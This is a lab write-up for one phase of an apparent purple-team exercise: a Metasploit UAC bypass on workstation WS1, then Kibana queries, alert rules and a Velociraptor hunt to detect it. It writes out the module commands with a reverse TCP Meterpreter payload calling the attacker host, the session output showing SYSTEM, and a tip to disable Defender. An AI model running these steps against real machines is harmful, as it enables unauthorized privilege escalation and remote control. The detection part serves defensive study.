# Phase 4: Privilege Escalation – UAC Bypass on WS1 (and Note on WS2)

## 1. Objective

After gaining initial access on WS1 as `normaluser`, the attacker escalates privileges to **SYSTEM** to enable credential dumping, lateral movement, and persistence.

This phase uses Metasploit’s UAC bypass module exploiting trusted Windows binaries such as `eventvwr.exe` and `sdclt.exe` to bypass User Account Control without user interaction.

---

### MITRE ATT&CK Mapping

- **Tactic:** TA0004 – Privilege Escalation  
- **Technique:** T1548.002 – Bypass User Account Control  

---

### WS2 Note

WS2 (`192.168.1.30`) was not used for manual privilege escalation. Although Caldera agents were present, no UAC bypass was executed there. WS2 remained unaffected in this phase.

---

## 2. Attack Execution

All commands were executed from the existing Meterpreter session on WS1 (`192.168.1.20`).

---

### 2.1 UAC Bypass Execution

From Meterpreter:

```text
meterpreter > background
```

In msfconsole:

```text
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4445
run
```

---

### Parameter Explanation

- `SESSION 1` → Target active session  
- `PAYLOAD` → New elevated Meterpreter payload  
- `LHOST` → Attacker IP  
- `LPORT 4445` → Listener port for elevated session  

---

## 2.2 Successful Privilege Escalation

```text
[*] Started reverse TCP handler on 192.168.1.5:4445
[*] Sending stage (200000 bytes) to 192.168.1.20
[*] Meterpreter session 2 opened (192.168.1.5:4445 -> 192.168.1.20:49321)
```

---

### Verify Privileges

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## 3. Detection in Kibana

UAC bypass generates process creation logs for trusted Windows binaries executed in abnormal contexts.

---

### 3.1 Key Event Types

| Event ID | Source | Description |
|----------|--------|-------------|
| 4688 | Security | Process creation |
| 1 | Sysmon | Detailed process creation |
| 4673 | Security | Sensitive privilege use |
| 10 | Sysmon | Process access events |

---

### 3.2 Kibana Queries

#### eventvwr.exe execution

```text
winlog.event_id: 4688 AND process.executable: *eventvwr.exe
```

#### sdclt.exe execution

```text
winlog.event_id: 4688 AND process.executable: *sdclt.exe
```

#### Suspicious Parent Process

```text
winlog.event_id: 4688 AND (process.executable: *eventvwr.exe OR process.executable: *sdclt.exe) AND winlog.event_data.ParentProcessName: *cmd.exe
```

---

### Example Event (WS1)

| Field | Value |
|------|------|
| Event ID | 4688 |
| Process | eventvwr.exe |
| Parent Process | cmd.exe |
| Host | WS1 |
| User | normaluser |

---

## 4. Detection Rules (Kibana Alerting)

---

### Rule 1 – eventvwr.exe UAC Bypass

- **Name:** UAC Bypass – eventvwr.exe from CMD  
- **Index:** winlogbeat-*  
- **Query:**

```text
winlog.event_id: 4688 AND process.executable: *eventvwr.exe AND winlog.event_data.ParentProcessName: *cmd.exe
```

- **Schedule:** Every 5 minutes  
- **Threshold:** > 0  

---

### Rule 2 – sdclt.exe Abnormal Execution

- **Name:** UAC Bypass – sdclt.exe anomaly  
- **Index:** winlogbeat-*  
- **Query:**

```text
winlog.event_id: 4688 AND process.executable: *sdclt.exe AND NOT winlog.event_data.ParentProcessName: *explorer.exe
```

---

## 5. Velociraptor Hunting

### Artifact Used
- `Windows.System.Pslist`

### Query

```sql
SELECT Name, Pid, ParentPid, CommandLine, CreateTime
FROM hunt_results()
WHERE Name =~ '(?i)eventvwr.exe|sdclt.exe'
```

### Findings

- WS1 → eventvwr.exe and sdclt.exe spawned from cmd.exe  
- WS2 → No suspicious processes (clean system)

---

## 6. Cleanup

UAC bypass does not leave persistent artifacts.

Optional cleanup:

```text
meterpreter > exit
sessions -k 2
```

---

## 7. Screenshot Checklist

Capture:

- Metasploit showing successful `bypassuac` execution  
- Meterpreter `getuid` showing SYSTEM  
- Kibana event showing eventvwr.exe with cmd.exe parent  
- Velociraptor process listing output  

---

## 8. Troubleshooting

| Issue | Cause | Fix |
|------|------|-----|
| DLL injection failed | Defender active | Disable real-time protection |
| Still normal user | Bypass failed | Retry or use alternate escalation module |
| No 4688 logs | Audit disabled | Enable Process Creation auditing |
| No Kibana events | Winlogbeat misconfig | Verify Security logs enabled |

---

## 9. Conclusion

The privilege escalation phase successfully elevated access from `normaluser` to **SYSTEM** on WS1 using a UAC bypass technique.

All activity was detected via Event ID 4688 and Sysmon logs, confirming that the monitoring stack provides visibility into common privilege escalation behavior.

WS2 remained unaffected, and Velociraptor validation confirmed no similar execution occurred on that system.